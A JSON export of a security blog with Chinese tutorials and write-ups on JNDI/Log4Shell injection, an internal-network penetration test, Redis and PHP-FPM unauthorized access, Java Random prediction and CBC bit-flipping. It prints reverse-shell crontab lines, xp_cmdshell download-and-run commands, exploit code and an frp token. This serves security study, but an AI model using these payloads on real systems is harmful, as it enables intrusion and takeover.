{"meta":{"title":"Hexo","subtitle":"","description":"","author":"r1ngs","url":"https://0xr1ngs.github.io","root":"/"},"pages":[{"title":"文章归档","date":"2023-06-19T12:43:47.648Z","updated":"2023-06-18T07:49:56.844Z","comments":true,"path":"archive.html","permalink":"https://0xr1ngs.github.io/archive.html","excerpt":"","text":""}],"posts":[{"title":"Jndi注入","slug":"Java-Jndi","date":"2023-06-19T11:21:26.000Z","updated":"2023-08-22T13:21:28.004Z","comments":true,"path":"2023/06/19/Java-Jndi/","link":"","permalink":"https://0xr1ngs.github.io/2023/06/19/Java-Jndi/","excerpt":"","text":"JNDI注入JNDI全称为Java Naming and Directory Interface（Java命名和目录接口），是SUN公司提供的一种标准的Java命名系统接口 命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务 目录服务通常使用树状结构来组织信息，LDAP是典型的目录服务，Active Directory是LDAP在Windows上的实现，OpenLDAP 是在 Linux 上的实现 JNDI_RMI服务端： package org.RmiDemo; import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.server.UnicastRemoteObject; public class Server { public static class RMIInstance extends UnicastRemoteObject implements IHello{ // 绑定到RMI的对象的类必须要继承自UnicastRemoteObject，并且要实现一个继承自java.rmi.Remote的接口 // 构造方法 protected RMIInstance() throws RemoteException { } // 实现接口 @Override public String sayHello(String name) throws RemoteException { return \"hello, \" + name; } } public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); RMIInstance rmiInstance = new RMIInstance(); Naming.bind(\"rmi://127.0.0.1/hello\",rmiInstance); } } 接口： package org.RmiDemo; import java.rmi.Remote; import java.rmi.RemoteException; public interface IHello extends Remote { // 必须抛出java.rmi.RemoteException异常 String sayHello(String name) throws RemoteException; } 客户端： package org.RmiDemo; import javax.naming.Context; import javax.naming.InitialContext; import java.util.Hashtable; public class Client { public static void main(String[] args) throws Exception{ // JNDI环境变量 Hashtable&lt;String, String> env = new Hashtable&lt;>(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://127.0.0.1\"); // javax.naming.InitialContext上下文 Context initialContext = new InitialContext(env); Object obj = initialContext.lookup(\"hello\"); if (obj instanceof IHello){ IHello myHello = (IHello) obj; // 强转为IHello实例，并且赋给IHello类型的引用变量 System.out.println(myHello.sayHello(\"world\")); } } } 动态协议转换:initialContext.lookup指定的参数可控 package org.RmiDemo; import javax.naming.Context; import javax.naming.InitialContext; public class Client { public static void main(String[] args) throws Exception{ // 不指定环境变量 Context initialContext = new InitialContext(); // 通过用户输入来动态识别调用的服务 Object obj = initialContext.lookup(\"rmi://127.0.0.1/hello\"); if (obj instanceof IHello){ IHello myHello = (IHello) obj; // 强转为IHello实例，并且赋给IHello类型的引用变量 System.out.println(myHello.sayHello(\"world\")); } } } 则可以指定一个攻击者的rmi服务，实例化恶意类达成攻击。但是恶意类在服务器端并不存在，也就调用不了方法，因此需要Reference类。如果远程获取RMI服务上的对象为Reference类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化。 // Constructs a new reference for an object with class name 'className', and the class name and location of the object's factory. // Params: // className – The non-null class name of the object to which this reference refers. // factory – The possibly null class name of the object's factory. // factoryLocation – The possibly null location from which to load the factory (e.g. URL) public Reference(String className, String factory, String factoryLocation) { this(className); classFactory = factory; classFactoryLocation = factoryLocation; } package org.RmiDemo; import java.rmi.Naming; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; public class Server { public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); Reference reference = new Reference(\"Arbitrary\",\"Evil\",\"&lt;http://127.0.0.1:8888/>\"); // Reference没有继承UnicastRemoteObject，因此需要com.sun.jndi.rmi.registry.ReferenceWrapper进行包装 ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference); Naming.bind(\"rmi://127.0.0.1/hello\",refObjWrapper); System.out.println(\"Server Running.\"); } } 在这个例子中，factory是工厂类，会去直接寻找 http://127.0.0.1:8888/Evil.class文件，然后实例化，我们可以直接在工厂类的构造方法中执行代码，或者在静态代码块中执行。因此，className可以是任意的。 Class.forName(name)会执行”类的初始化“，先后调用static、{}、构造函数 import java.io.IOException; public class Evil { public Evil() throws IOException { Runtime.getRuntime().exec(\"calc\"); } static { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException var1) { throw new RuntimeException(var1); } } } 然后用同版本（否则会报 Unsupported major.minor）jdk编译：javac [Evil.java](&lt;http://Evil.java&gt;) ，将其放入 http://127.0.0.1:8888 目录下，运行客户端代码即可弹出两次计算器（虽然会报 Evil cannot be cast to javax.naming.spi.ObjectFactory 但代码还是执行了）。 JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 JdbcRowSetImpl通过JdbcRowSetImpl也能触发： package org.RmiDemo; import com.sun.rowset.JdbcRowSetImpl; public class Client { public static void main(String[] args) throws Exception{ System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl(); JdbcRowSetImpl_inc.setDataSourceName(\"rmi://127.0.0.1/hello\"); JdbcRowSetImpl_inc.setAutoCommit(true); } } 触发点在setAutoCommit，参数是true还是false没有影响。 实验环境为 jdk 1.8.0_202，由于trustURLCodebase为false，如果不手动开启的话会报错：Exception in thread &quot;main&quot; java.lang.ClassCastException: javax.naming.Reference cannot be cast to javax.sql.DataSource 快速搭建JNDI环境： https://github.com/welk1n/JNDI-Injection-Exploit https://github.com/mbechler/marshalsec 8u191以后可以通过加载本地危险工厂类实现代码执行 https://github.com/veracode-research/rogue-jndi Log4shell可以用Springboot启动一个环境，maven依赖如下配置 &lt;dependencies> &lt;dependency> &lt;groupId>org.springframework.boot&lt;/groupId> &lt;artifactId>spring-boot-starter-web&lt;/artifactId> &lt;exclusions> &lt;!--先排除...--> &lt;exclusion> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-to-slf4j&lt;/artifactId> &lt;/exclusion> &lt;/exclusions> &lt;/dependency> &lt;dependency> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-api&lt;/artifactId> &lt;version>2.14.0&lt;/version> &lt;/dependency> &lt;dependency> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-core&lt;/artifactId> &lt;version>2.14.0&lt;/version> &lt;/dependency> &lt;/dependencies> 可以先测试是否能解析（高版本已经默认关闭解析）： Logger logger = LogManager.getLogger(BasicController.class); logger.error(\"name:{}\", \"${java:runtime}\"); logger.error(\"name:{}\", \"${jndi:dns://d4b3766c.ipv6.1433.eu.org}\"); 通过一个简单的controller测试： @Controller public class BasicController { private static final Logger logger = LogManager.getLogger(BasicController.class); // &lt;http://127.0.0.1:8080/hello?name=lisi> @RequestMapping(\"/hello\") @ResponseBody public String hello(@RequestParam(name = \"name\", defaultValue = \"unknown user\") String name) { logger.error(\"name: \" + name); return \"Hello \" + name; } ... //SpringDemoApplication.java System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); SpringApplication.run(SpringDemoApplication.class, args); 访问http://127.0.0.1:8080/hello?name=%24{jndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fcuizgz}即可执行恶意命令。","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"}]},{"title":"一次内网渗透测试","slug":"LGP-内网渗透","date":"2022-07-16T12:02:14.000Z","updated":"2023-09-20T15:44:06.167Z","comments":true,"path":"2022/07/16/LGP-内网渗透/","link":"","permalink":"https://0xr1ngs.github.io/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"","text":"外网跳板http://192.168.34.244/ 不能用http，能用file，但是过滤了www等，看不了index.php，可以用url编码绕过还可以用/proc/self/cwd Linux proc &#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。 /proc/self/cwd是一个软连接，指向用户目录，如果是web用户就指向web目录，也可以用来绕过，还比如/proc/net/arp 深入理解linux系统下proc文件系统内容 - zhezhelin - 博客园 可以看/etc/hosts 这台的ip是172.17.0.2，arp还能看到一个.0.1 web目录留了一个phpshell和root密码，可以直接查找匹配&#x2F;etc文件夹下的所有文件grep -rn &quot;root&quot; * 在蚁剑的shell里面不能su root,这样没法输密码，直接就会返回Password: su: Authentication failure 可以弹一个meterpreter，在meterpreter里进入shell，然后用su root，然后再以root权限执行shell.elf,这样就可以获得一个root的meterpreter docker 逃逸特权模式挂载用户目录 fdisk -l mkdir /test mount /dev/sda1 /test 这样相当于把宿主机的根目录挂载到了/test 可以通过test进行文件读写。 但是不能直接去test目录执行/bin/bash 只能通过写入ssh key或者crontab的形式 但是注意，不能直接把反弹shell的命令写到任务里，而是应该写入一个sh文件 */1 * * * * /bin/bash -i >&amp; /dev/tcp/192.168.33.116/12501 0>&amp;1 ❌ */1 * * * * root bash /tmp/shell.sh ✅ 原因： 解决ubuntu crontab反弹shell失败的问题 简单来说就是centos里面的cron中执行的shell环境是/bin/sh，ubuntu中/bin/sh这个软连接指向了dash 。但是不执行dash直接执行/test/bin/bash也是不行的。因为没有用chroot切换/test为根目录，而且弹过来的也不是宿主机的shell，因为这样相当于在原来基础上只是加了一个/bin/bash而已。 同时，如果前面的crontab任务有错，后面的应该也是不执行的，比如前一句忘了写执行的用户 /etc/crontab 和 /var/spool/cron区别：/var/spool/cron/这个目录是以账号来区分每个用户自己的执行计划，而/etc/crontab系统执行计划，需要在五个*后面加上用户，比如上面没有写到/etc/crontab没有加root就是错误的 然后现在通过反弹的shell再弹meterpreter就有宿主机shell了 内网移动mssql[+] NetInfo: [*]172.16.2.4 [->]MSSQL [->]172.16.2.4 [+] NetInfo: [*]172.16.2.2 [->]outx-rivate-PC [->]172.16.2.2 [+] NetInfo: [*]172.16.2.1 [->]DC [->]172.16.2.1 [+] 172.16.2.1 MS17-010 (Windows Server 2012 R2 Datacenter 9600) [+] 172.16.2.2 MS17-010 (Windows 7 Professional 7601 Service Pack 1) 不拿17-010打了，打mssql ，密码在web配置文件里有，但是这台mssql只连通172.16.2.0网段，要反弹回来的话只能在跳板机做一个端口转发，跳板机做server，攻击机做client，payload反弹到server的12001端口相当于反弹到了client的12001端口，listener这样设置 172.16.2.12就是跳板机的一个网卡ip，另一个是192.168.34.244。攻击机的frpc.ini 配置为 [common] tls_enable = true token = qax_scu server_addr = 192.168.34.244 server_port = 7200 [http_proxy] type = tcp remote_port =12001 plugin=http_proxy local_port =12001 local_ip =127.0.0.1 然后不能用cs直接通过listener生成payload，然后mssql_exec执行，因为经过排查后发现这样生成的payload根本没有走http流量，可能是个cs的bug，所以只能生成exe文件然后下载执行。 其次，msf的mssql_exec模块如果返回有中文字符会直接报错，建议直接用navicat 跳板机有python3，起一个http.server就可以，然后下载到progamdata执行 exec master..xp_cmdshell \"powershell Invoke-WebRequest http://172.16.2.12:12345/beacon.exe -OutFile C://programdata/beacon.exe\" exec master..xp_cmdshell \"C://programdata/beacon.exe\" 提权mssql是nt/service权限，用ms16-075一键提权，弹回新的shell，然后hashdump和mimikatz hashdump返回的结果格式为： Username:RID:LM-HASH:NTLM-HASH cmd5支持NTLM解密 PTHwindow vista之后没办法使用RID非500的本地管理员用户来进行Pass The Hash, 但是如果是域用户且该域用户属于本地Administrators组的成员也可以进行pass the hash CS攻击在cs里，视图⇒目标⇒添加目标，添加DC，输入ip地址，然后psexec 直接就上线了，PC机也可以这么做","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://0xr1ngs.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"redis未授权访问","slug":"redis","date":"2019-12-12T12:52:05.000Z","updated":"2023-09-20T15:49:22.335Z","comments":true,"path":"2019/12/12/redis/","link":"","permalink":"https://0xr1ngs.github.io/2019/12/12/redis/","excerpt":"","text":"Redis未授权访问Redis的默认密码为空所导致，主要危害来源在于其可以以Redis启动权限写文件： root身份运行时，可以给root账户写SSH公钥，直接登录服务器 写入crontab创建计划任务 主从复制执行命令 写入公钥需要root权限 本地生成公钥： ssh-keygen -t rsa 将公钥写入1.txt,并传入redis缓存 (echo -e &quot;\\\\n\\\\n&quot;; cat id_rsa.pub; echo -e &quot;\\\\n\\\\n&quot;) &gt; 1.txt （前后增加换行，否则 redis持久化会写入额外的不可见字符导致公钥识别失败） cat 1.txt | redis-cli -h 192.168.125.128 -x set 1 设置路径、文件、写入公钥 config set dir /root/.ssh config set dbfilename authorized_keys save 使用生成的公钥连接 ssh -i id_rsa r1ngs@192.168.125.128 实际上：尽管使用 root 用户启动了 Redis，Redis 本身会在启动后将自身的权限降低为 redis 用户（ps aux |grep redis）。config set dir时便会爆出：(error) ERR Changing directory: Permission denied 如果要让redis以root方式启动，可以手动编译安装低版本源码。 同理，可以写入Webshell。 写入Contabconfig set dir /var/spool/cron/crontabs config set dbfilename root set 1 &quot;\\\\n\\\\n* * * * * bash -i &gt;&amp; /dev/tcp/47.113.150.151/12345 0&gt;&amp;1\\\\n\\\\n&quot; save 实际还是需要root权限。 主从复制主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)。数据会单向自动同步，一般从机只负责读，主机只负责写。 在Reids 4.x之后(&lt;&#x3D;5.0.5)，Redis新增了模块功能，通过加载动态链接库执行命令。主从复制就是用来将动态链接库传输到redis服务器。从机设置slaveof以后，主机可以通过发送FULLRESYNC（全量同步，会同步rdb文件）同步文件到从机上。 在主机上设置： 127.0.0.1:6379> config set dir /home/r1ngs/redis-rogue-getshell-master/RedisModulesSDK OK 127.0.0.1:6379> config set dbfilename exp.so OK 然后在从机上 127.0.0.1:6379> config set dir /home/r1ngs OK 127.0.0.1:6379> config set dbfilename exp.so OK 127.0.0.1:6379> slaveof 192.168.125.128 6379 OK 执行完成以后会立即生成&#x2F;home&#x2F;r1ngs&#x2F;exp.so，但是生成的exp.so是主机的持久化文件（文件大小不一样）。因此，需要模拟请求。 https://github.com/vulhub/redis-rogue-getshell 关键代码： elif arr[0].startswith(b'PSYNC') or arr[0].startswith(b'SYNC'): self.request.sendall(b'+FULLRESYNC ' + b'Z' * 40 + b' 1' + DELIMITER) self.request.sendall(b'$' + str(len(self.server.payload)).encode() + DELIMITER) self.request.sendall(self.server.payload + DELIMITER)","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"未授权访问","slug":"未授权访问","permalink":"https://0xr1ngs.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"}]},{"title":"php-fpm","slug":"php-fpm","date":"2019-12-12T12:47:50.000Z","updated":"2023-09-20T15:55:51.201Z","comments":true,"path":"2019/12/12/php-fpm/","link":"","permalink":"https://0xr1ngs.github.io/2019/12/12/php-fpm/","excerpt":"","text":"PHP-FPMPHP-FPM (FastCGI Process Manager)是PHP官方提供的进程管理，以守护进程的方式运行在系统后台，根据系统负载的需要管理不定数量的PHP-FPM子进程。 浏览器通过HTTP与Nginx通信，Nginx通过FastCGI协议与PHP-FPM通信。Web服务器接收到HTTP数据包以后，会解析数据包，解析完成以后，把从数据包中获得的关键信息写入CGI环境变量，然后发送给PHP-FPM。PHP-FPM需要执行的内容，几乎都从CGI环境变量中获取，比如它会执行 SCRIPT_FILENAME环境变量中指向的PHP文件，并将这些环境变量填充到PHP的超全局变量$_SERVER中。 PHP-FPM未授权访问如果服务器将PHP-FPM的接口（默认端口9000）对外开放，就可以构造恶意的FastCGI记录发送给PHP-FPM，从而执行任意的PHP代码。 曾经，用户可以将 SCRIPT_FILENAME指定为任意后缀文件。但后来，PHP-FPM默认配置增加了security.limit_extensions，限定只有某些后缀文件才会被PHP执行，默认.php。因此，需要找到一个存在的PHP文件，一个小技巧是：/usr/local/lib/php/PEAR.php。 但这只能执行本地的PHP文件，因此需要php.ini的两个配置：auto_prepend_file和 auto_append_file。分别表示在执行目标文件之前和执行目标文件之后，包含指向的文件。如果设置 auto_prepend_file 为php:&#x2F;&#x2F;input就可以执行代码（需要开启allow_url_include）。 如何更改php配置？可以通过 PHP-FPM的两个环境变量 ：PHP-VALUE和 PHP-ADMIN-VALUE 。前者可以设置级别为PHP_INI_USER和PHP_INI_ALL的选项；后者可以设置除了disable_functions的所有选项。 { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1' 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' } Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 | 离别歌 配置安装PHP+Nginx： apt-get install nginx sudo systemctl start nginx sudo systemctl enable nginx sudo add-apt-repository ppa:ondrej/php sudo apt update sudo apt install php5.6-fpm php5.6-common php5.6-mysql php5.6-cli php5.6-json php5.6-opcache php5.6-mbstring php5.6-zip php5.6-gd php5.6-curl php5.6-xml php5.6-xmlrpc （Nginx一些不好的配置： Pitfalls and Common Mistakes | NGINX 更改 /etc/php/5.6/fpm/pool.d/www.conf： listen = /run/php/php5.6-fpm.sock ⇒ listen = 0.0.0.0:9000 以及nginx的配置： location ~ \\\\.php$ { include snippets/fastcgi-php.conf; # # With php-fpm (or other unix sockets): # fastcgi_pass unix:/var/run/php/php5.6-fpm.sock; # With php-cgi (or other tcp sockets): fastcgi_pass 127.0.0.1:9000; }","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"未授权访问","slug":"未授权访问","permalink":"https://0xr1ngs.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"}]},{"title":"解n次同余方程","slug":"解n次同余方程","date":"2019-11-15T13:58:01.000Z","updated":"2023-09-20T15:57:48.829Z","comments":true,"path":"2019/11/15/解n次同余方程/","link":"","permalink":"https://0xr1ngs.github.io/2019/11/15/%E8%A7%A3n%E6%AC%A1%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B/","excerpt":"","text":"二次同余方程的解形式$x^2\\equiv n\\ (mod\\ p)$， $p$是奇素数 解设$a$满足$w&#x3D;a^2-n$不是模$p$的二次剩余($w^{\\frac{p-1}{2}}\\equiv-1\\ (mod;p)$)，那么$x\\equiv (a+\\sqrt{w})^\\frac{p+1}{2}$即为解 证明$(a+\\sqrt{w})^p\\equiv a^p+w^{\\frac{p-1}{2}}\\sqrt{w}\\equiv a-\\sqrt{w}$，(二项式定理展开，又由于$p$是素数可以推导$p\\ |\\ C_p^i$) $x^2 \\equiv (a+\\sqrt{w})^{p+1}\\equiv (a+\\sqrt{w})^{p} (a+\\sqrt{w})\\equiv (a-\\sqrt{w})(a+\\sqrt{w})\\equiv n$ demo$\\sqrt w$是负数或者非整数的话，可以定义实部和虚部利用快速幂进行计算，时间复杂度$O(log\\ N)$ from Crypto.Util.number import getPrime from random import randint p = getPrime(512) x = randint(1, p) n = pow(x, 2, p) def power(s1, s2, k1, k2, w, p): return ((s1*k1+s2*k2*w)%p, (s1*k2+s2*k1)%p) def _solve(p, n): a = randint(1, p) w = a ** 2 - n while pow(w, (p-1)/2, p) !=p-1 : a = randint(1, p) w = a ** 2 - n times = (p+1)/2 k1 = 1 k2 = 0 first = True sum1 = 1 sum2 = 0 while times != 0: if first: k1, k2=power(k1, k2, a, 1, w, p) first = False else: k1, k2=power(k1, k2, k1, k2, w, p) if times &amp; 1: sum1, sum2 = power(sum1, sum2, k1, k2, w, p) times >>= 1 return sum1 get_x = _solve(p, n) assert pow(get_x, 2, p) == n print 'possible x1 is: ' + str(get_x) print 'possible x2 is: ' + str(p - get_x) print 'raw x is: '+ str(x) 参考Cipolla&#39;s algorithm n次同余方程的解集成了一系列复杂算法。all_roots为False的话返回最小的根 from Crypto.Util.number import getPrime from random import randint from sympy.ntheory.residue_ntheory import nthroot_mod p = getPrime(150) x = randint(1, p) n = pow(x, 4, p) x1 = nthroot_mod(n,4,p,all_roots=False) assert pow(x1, 4, p) == n print x1","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"}],"tags":[]},{"title":"Java Random方法的安全问题","slug":"java-random","date":"2019-05-31T08:37:35.000Z","updated":"2023-09-20T16:08:35.615Z","comments":true,"path":"2019/05/31/java-random/","link":"","permalink":"https://0xr1ngs.github.io/2019/05/31/java-random/","excerpt":"","text":"前言起源于强网杯的密码学题目random study java.util.Random题目中challenge two的主要代码如下： o = subprocess.check_output([\"java\", \"Main\"]) tmp=[] for i in o.split(\"\\n\")[0:3]: tmp.append(int(i.strip())) v1=tmp[0] % 0xffffffff v2=tmp[1] % 0xffffffff v3=tmp[2] % 0xffffffff 还给了一个Main.class文件，打开发现是字节码，用jd-gui反编译得到源码如下： public class Main { public static void main(String[] paramArrayOfString) { Random random = new Random(); System.out.println(random.nextInt()); System.out.println(random.nextInt()); System.out.println(random.nextInt()); } } 代码的意思很简单，调用random.nextInt方法生成三个连续的随机数，要求根据前两个随机数去预测第三个随机数 源码分析为了了解这个方法出现的安全问题的原理，有必要去查看一下这个方法的源代码 在eclipse中将光标移动到nextInt处按F3可以追踪到jdk包里的具体代码 可以看到它直接调用了next方法，传递的参数是32。 继续追踪next方法 可以看到前一个随机数种子和后一个随机数种子都是定义为long类型的，方法返回的值就是下一个种子右移16位然后强转为int的结果 while里的compareAndSet方法只是比较当前的种子值是否为oldseed，如果是的话就更新为nextseed而已，一般都会返回true 而下一个种子的更新算法就在do-while循环里面：nextseed = (oldseed * multiplier + addend) &amp; mask，种子的初始值是将当前系统时间带入运算的结果 可以在类定义的开头处看到这几个常量属性的值 而这个种子的更新算法本质上就是一个线性同余生成器 线性同余生成器（LCG）LCG是形如这样的式子： 和上面的代码对比可以看出是基本一致的，因为和mask常量做与运算就相当于是舍弃高位，保留2进制的低48位，也就相当于模2的48次方 那么我们既然都有了常量的值了，我们就可以去做第三个随机数的预测了 预测方法很简单，如果把生成第一个随机数的种子定义为seed1，seed2、seed3往后顺延的话 seed1右移16位就是第一个随机数的值，也就是说第一个随机数就丢失了16位，所以seed1就有2的16次方种可能，那么把这2的16次方种可能带入计算下一个seed2，并且右移查看是否和第二个随机数相等就能知道是否正确找到了seed1了 先看一组简单的测试样例，输出的三个随机数都是正数 a = 0x5DEECE66DL b = 0xBL mask = (1L &lt;&lt; 48) - 1 def findseed(x1, x2): seed = x1 &lt;&lt; 16 for i in range(2 ** 16): if ((a * seed + b) &amp; mask) >> 16 == x2: return seed seed += 1 if __name__ == '__main__': x1 = 1564370740 x2 = 2121441037 seed1 = findseed(x1, x2) seed2 = (a * seed1 + b) &amp; mask x3 = ((a * seed2 + b) &amp; mask) >> 16 print x3 通过测试，结果正确 但是你可能会好奇为什么测试的java代码有时候会输出负数，因为右移1位是相当于除以2的，一个正数除以一个正数怎么会得到一个负数呢？ 实际上这是由于java代码中的int强制类型转换和&gt;&gt;&gt;无符号右移所造成的 补码先来回顾一下java的int类型，int类型占四个字节，也就是二进制的32位 计算机中的数字通常用二进制补码表示，最高位为符号位，正数为0，负数为1，所以表示数值的一共有31位，故int类型的最小值为-2147483648（-2的31次方）最大值为 2147483647（2的31次方-1） 你可能会好奇为什么负数比正数多表示了1位，因为自然数0就是用全为0（包括符号位）的二进制表示的，而到负数那里是没有负0的概念的，所以可以多表示一个数 接下来可以开始说&gt;&gt;&gt;的意思了 java中有两种右移，一种是&gt;&gt;，代表逻辑上的右移(除以)，高位补为符号位；一种是&gt;&gt;&gt;代表无符号右移，高位直接补0 看一下这种情况： 前两个为正数，但是第三个为负数，我们先按照上面的方法计算出seed3和它右移16位的结果： a = 0x5DEECE66DL b = 0xBL mask = (1L &lt;&lt; 48) - 1 def findseed(x1, x2): seed = x1 &lt;&lt; 16 for i in range(2 ** 16): if ((a * seed + b) &amp; mask) >> 16 == x2: return seed seed += 1 if __name__ == '__main__': x1 = 1135971603 x2 = 1130772191 seed1 = findseed(x1, x2) seed2 = (a * seed1 + b) &amp; mask seed3 = (a * seed2 + b) &amp; mask print seed3 print seed3.bit_length() print '{:064b}'.format(seed3) print '{:064b}'.format(seed3>>16) 输出结果为 141635148990318 48 0000000000000000100000001101000100000000101111100100011101101110 0000000000000000000000000000000010000000110100010000000010111110 这样就能看出问题在哪了，由于seed3右移了16位以后除了补0的高位就只有32位了，使用int强转以后java把它从long类型转换成了int，并且自动忽略了32位以后的高位，这就相当于我们得到的第三个随机数用补码表示为 10000000110100010000000010111110 可以看出来最高位为1，也就是说这个补码代表了一个负数，那么我们怎么通过补码找到这个负数的真值呢？很简单，对补码再求一次补码就行了，也就是取反后加1。 即 01111111001011101111111101000010，对应的二进制位2133786434，所以第三个随机数应该为-2133786434，如此一来，我们就可以通过负数找到其对应的seed了 exp最终通过两个随机数预测第三个随机数的exp如下： a = 0x5DEECE66DL b = 0xBL mask = (1L &lt;&lt; 48) - 1 def n2p(x): y = -x y ^= 2 ** 32 - 1 #取反 y += 1 return y def findseed(x1, x2): if x1 &lt; 0: x1 = n2p(x1) if x2 &lt; 0: x2 = n2p(x2) seed = x1 &lt;&lt; 16 for i in range(2 ** 16): if ((a * seed + b) &amp; mask) >> 16 == x2: return seed seed += 1 def cal_x(seed): x = seed>>16 if '{:032b}'.format(x).startswith('1'): x ^= 2 ** 32 - 1 x += 1 return -x return x if __name__ == '__main__': x1 = 187562908 x2 = 1663125607 seed1 = findseed(x1, x2) seed2 = (a * seed1 + b) &amp; mask seed3 = (a * seed2 + b) &amp; mask x3 = cal_x(seed3) print x3 经过测试，无论x1或者x2是否为负数，都可以准确预测 总结以前学习LCG的时候，只是知道了它的原理，并没有接触到它在实际情况中的应用，通过这次比赛，学到了java的random方法的安全漏洞，同时也十分感谢出题人提供的学习机会","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"}]},{"title":"对字节反转攻击的深入研究","slug":"cbc-bit-flip","date":"2019-03-28T08:28:53.000Z","updated":"2023-08-22T13:17:16.236Z","comments":true,"path":"2019/03/28/cbc-bit-flip/","link":"","permalink":"https://0xr1ngs.github.io/2019/03/28/cbc-bit-flip/","excerpt":"","text":"对字节反转攻击的深入研究前言现在无论你是google还是百度，”字节反转攻击”的搜索结果整整几页都是”CBC字节反转攻击”，看来字节反转攻击和CBC模式结合的想法已经可以说是深入人心，毕竟它的名字就叫”CBC反转字节攻击”，但是不是这种攻击只有CBC分组模式才有呢？如果不用CBC分组模式，是不是就不存在这种重放攻击呢？笔者就这个问题进行了研究。 CBCCBC模式下的字节反转攻击想必大家都不陌生了，这种攻击方式和分组加密的加密算法无关，是在处理明文加密后的密文块时出现了漏洞：前一块的密文可以影响后一块的明文。 这种图引用自国外一个大佬的文章，攻击手法是简单明了的： C1 xor D(C2) &#x3D; P2 那么我们令C1&#x3D;C1 xor P2 xor P发送给服务器，其中P是我们想要篡改的明文，那么服务器会计算： (C1 xor P2 xor P) xor D(C2) &#x3D; (P2 xor D(C2)) xor P2 xor P xor D(C2) &#x3D; P 也就达到了篡改的效果，下面是作者自己写的测试demo from Crypto.Cipher import AES from os import urandom from Crypto.Util.strxor import strxor class AES_CBC: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_CBC, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_CBC, self.iv) return aes.decrypt(cipher) plain = '1'*32 aes = AES_CBC() cipher = aes.encrypt(plain) print aes.decrypt(cipher) cipher = strxor(strxor(cipher[:16], '1'*16), '2'*16)+cipher[16:] print aes.decrypt(cipher) 运行结果为： 前16个字节乱码是因为我们篡改了C1后，对应的D(C1)也发生了改变 CFBCFB模式可以将块密码转换为同步的流密码。流密码通俗点讲就是将明文逐字节的进行加密，它生成密钥流块，然后与明文块进行异或，然后获得密文。 